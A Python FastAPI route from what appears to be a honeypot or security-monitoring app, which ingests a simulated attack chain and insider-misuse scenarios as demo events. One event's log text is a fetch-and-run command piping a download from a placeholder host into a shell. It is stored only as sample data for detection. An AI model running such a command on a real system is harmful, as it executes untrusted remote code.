from __future__ import annotations

import uuid
from datetime import datetime, timezone
from typing import Literal

from fastapi import APIRouter, Body, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.dependencies import get_current_user, get_db
from app.config import settings
from app.models.event import AttackEvent, EventType
from app.services.event_processor import process_event

router = APIRouter()


class DemoRunOut(BaseModel):
    session_id: str
    events_created: int
    message: str


class DemoRunRequest(BaseModel):
    scenario: Literal["credential-to-exfiltration", "employee-misuse", "administrator-misuse"] = "credential-to-exfiltration"


def insider_sequence(scenario: str) -> list[tuple[EventType, str, dict]]:
    employee = scenario == "employee-misuse"
    base = {
        "actor_id": "demo-employee-001" if employee else "demo-admin-001",
        "role": "employee" if employee else "administrator",
        "resource": "finance/decoy-quarterly-export.csv" if employee else "admin/decoy-service",
    }
    if employee:
        return [
            (EventType.LOGIN_SUCCESS, "Employee signed in with a valid account", base),
            (EventType.FILE_DOWNLOAD, "Account read an out-of-scope decoy export", {**base, "sensitive": True, "outside_scope": True, "honeytoken": True}),
            (EventType.FILE_DOWNLOAD, "Account downloaded 1,500 synthetic finance records", {**base, "sensitive": True, "records_accessed": 1500}),
            (EventType.FILE_UPLOAD, "Synthetic export sent to an unapproved destination", {**base, "sensitive": True, "destination": "unapproved_external"}),
        ]
    return [
        (EventType.LOGIN_SUCCESS, "Administrator signed in with a valid account", base),
        (EventType.COMMAND, "Routine privilege update with approved change", {**base, "admin_action": "privilege_change", "approved_change": True}),
        (EventType.COMMAND, "Audit logging disabled without an approved change", {**base, "admin_action": "audit_disabled"}),
        (EventType.COMMAND, "Account privileges changed without an approved change", {**base, "admin_action": "privilege_change"}),
        (EventType.COMMAND, "Decoy credentials exported without an approved change", {**base, "admin_action": "credential_export", "honeytoken": True}),
    ]


@router.post("/run", response_model=DemoRunOut)
async def run_demo(
    payload: DemoRunRequest | None = Body(default=None),
    db: AsyncSession = Depends(get_db),
    _user: str = Depends(get_current_user),
):
    if not settings.demo_mode:
        raise HTTPException(status_code=403, detail="Demo mode is disabled")
    session_id = f"demo-{uuid.uuid4().hex[:12]}"
    attacker_ip = "198.51.100.42"  # TEST-NET-2, never a real attacker address.
    scenario = payload.scenario if payload else "credential-to-exfiltration"
    sequence = [
        (EventType.CONNECTION, "SSH connection accepted by local lab decoy", 0, None),
        (EventType.LOGIN_ATTEMPT, "Failed password for admin from 198.51.100.42", 0, "admin"),
        (EventType.LOGIN_SUCCESS, "Accepted password for deploy from 198.51.100.42", 0, "deploy"),
        (EventType.COMMAND, "curl -fsSL http://example.invalid/bootstrap.sh | sh", 0, "deploy"),
        (EventType.EXPLOIT_ATTEMPT, "HTTP decoy: attempted /admin/export?format=sql", 0, None),
        (EventType.CANARY_TRIP, "Demo URL canary callback from simulated attacker", 0, None),
    ]
    contexts = [None] * len(sequence)
    if scenario != "credential-to-exfiltration":
        steps = insider_sequence(scenario)
        sequence = [(kind, log, 0, context["actor_id"]) for kind, log, context in steps]
        contexts = [context for _, _, context in steps]
    for (event_type, raw_log, score, username), context in zip(sequence, contexts):
        event = AttackEvent(
            event_type=event_type,
            source_ip=attacker_ip,
            source_port=49152,
            username=username,
            raw_log=raw_log,
            parsed_data={"source": "demo_scenario", "simulated": True, "scenario": scenario, **({"insider": context} if context else {})},
            session_id=session_id,
            threat_score=score,
            timestamp=datetime.now(timezone.utc),
        )
        db.add(event)
        await db.flush()
        # Portfolio demos must be fast, reproducible, offline, and free of API cost.
        await process_event(db, event, use_llm=False)
    return DemoRunOut(session_id=session_id, events_created=len(sequence), message="Simulated attack chain ingested")
